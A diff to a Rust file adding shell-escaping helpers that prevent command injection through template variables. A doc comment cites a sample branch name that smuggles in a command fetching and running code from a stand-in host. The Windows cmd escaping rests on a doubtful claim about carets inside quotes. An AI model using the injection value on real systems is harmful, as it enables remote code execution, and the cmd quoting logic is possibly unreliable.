@@ -40,6 +40,71 @@ pub fn resolve_template(template: &str, vars: &TemplateVariables) -> String {
     out
 }
 
+/// Like `resolve_template`, but each substituted value is escaped so it
+/// survives a single round of shell parsing as a single literal argument.
+///
+/// Use this whenever the resolved string is fed to `/bin/sh -c` or `cmd /C`.
+/// Without it, a value containing shell metacharacters (e.g. a branch named
+/// `main$(curl evil|sh)`) is concatenated into the command string and
+/// re-interpreted by the shell, yielding arbitrary command execution.
+pub fn resolve_template_shell(template: &str, vars: &TemplateVariables) -> String {
+    let mut out = template.to_string();
+    for (key, value) in vars.pairs() {
+        let needle = format!("${key}");
+        let escaped = if cfg!(target_os = "windows") {
+            shell_escape_cmd(value)
+        } else {
+            shell_escape_posix(value)
+        };
+        out = out.replace(&needle, &escaped);
+    }
+    out
+}
+
+/// Quote `value` so POSIX `sh -c` reads it as one literal argument.
+///
+/// Wraps the value in single quotes and rewrites embedded single quotes as
+/// `'\''`. Single-quoted strings in POSIX shell disable every form of
+/// expansion (parameter, command, arithmetic, glob), so the result is inert.
+pub fn shell_escape_posix(value: &str) -> String {
+    let mut out = String::with_capacity(value.len() + 2);
+    out.push('\'');
+    for c in value.chars() {
+        if c == '\'' {
+            out.push_str("'\\''");
+        } else {
+            out.push(c);
+        }
+    }
+    out.push('\'');
+    out
+}
+
+/// Quote `value` for Windows `cmd /C`.
+///
+/// cmd.exe has no equivalent of POSIX single quotes: even inside `"..."`,
+/// characters like `%`, `!`, `^`, `&`, `|`, `<`, `>` can be metacharacters
+/// depending on whether delayed expansion is on. We wrap the value in double
+/// quotes, double up embedded `"`, and caret-escape every cmd metacharacter
+/// — including inside the quotes, where caret is still respected before the
+/// next character is consumed.
+pub fn shell_escape_cmd(value: &str) -> String {
+    let mut out = String::with_capacity(value.len() + 2);
+    out.push('"');
+    for c in value.chars() {
+        match c {
+            '"' => out.push_str("\"\""),
+            '%' | '!' | '^' | '&' | '|' | '<' | '>' | '(' | ')' => {
+                out.push('^');
+                out.push(c);
+            }
+            _ => out.push(c),
+        }
+    }
+    out.push('"');
+    out
+}
+
 /// Last path component of `git_root` — the repository's directory name.
 pub fn repository_base_name(git_root: &Path) -> String {
     git_root
